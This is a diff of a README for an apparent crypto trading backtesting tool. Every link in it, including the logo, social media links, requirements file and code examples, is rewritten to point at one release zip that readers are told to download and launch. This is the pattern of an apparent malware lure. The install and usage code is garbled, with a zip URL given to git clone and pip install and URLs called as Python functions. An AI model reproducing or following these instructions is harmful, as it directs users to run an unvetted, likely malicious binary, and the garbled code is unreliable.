@@ -2,7 +2,7 @@
 
 Welcome to the CryptoTradeMate Backtesting Tool repository, your go-to resource for backtesting, simulating, analyzing, and optimizing crypto trading strategies! Whether you are a trader, developer, or analyst, this open-source tool will enable you to harness the power of advanced Python libraries and API integration to enhance your trading skills.
 
-![CryptoTradeMate Logo](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)
+![CryptoTradeMate Logo](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)
 
 ## Features 🚀
 
@@ -17,8 +17,8 @@ Welcome to the CryptoTradeMate Backtesting Tool repository, your go-to resource 
 To get started with the CryptoTradeMate Backtesting Tool, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the required Python libraries listed in the `https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip` file.
-3. Download the backtesting tool from the [https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip link](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip) and launch the tool.
+2. Install the required Python libraries listed in the `https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip` file.
+3. Download the backtesting tool from the [https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip link](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip) and launch the tool.
 
 If the link ends with the file name, you need to launch the downloaded software to start using the tool. 
 
@@ -27,9 +27,9 @@ If the link ends with the file name, you need to launch the downloaded software 
 You can install the CryptoTradeMate Backtesting Tool by following these steps:
 
 ```bash
-$ git clone https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip
+$ git clone https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip
 $ cd cryptotrademate-backtesting-tool
-$ pip install -r https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip
+$ pip install -r https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip
 ```
 
 ## Usage 📊
@@ -44,10 +44,10 @@ from cryptotrademate import Backtest
 backtest = Backtest()
 
 # Run a backtest on your trading strategy
-https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip(strategy='EMA Crossover', start_date='2021-01-01', end_date='2021-12-31')
+https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip(strategy='EMA Crossover', start_date='2021-01-01', end_date='2021-12-31')
 
 # Analyze the backtest results
-https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip()
+https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip()
 ```
 
 ## Contributing 🤝
@@ -66,13 +66,13 @@ The CryptoTradeMate Backtesting Tool is licensed under the MIT License. See the 
 
 ### Connect with Us
 
-- Follow us on [Twitter](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)
-- Join our community on [Discord](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)
+- Follow us on [Twitter](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)
+- Join our community on [Discord](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)
   
-[![Download Software](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)
 
 ---
 
 Feel free to explore the different functionalities of the CryptoTradeMate Backtesting Tool and take your crypto trading strategies to the next level! Happy trading! 📈💰
 
-![CryptoTradeMate](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v1.0/Release.zip)
+![CryptoTradeMate](https://github.com/Supermariopixel/cryptotrademate-backtesting-tool/releases/download/v2.0/Software.zip)
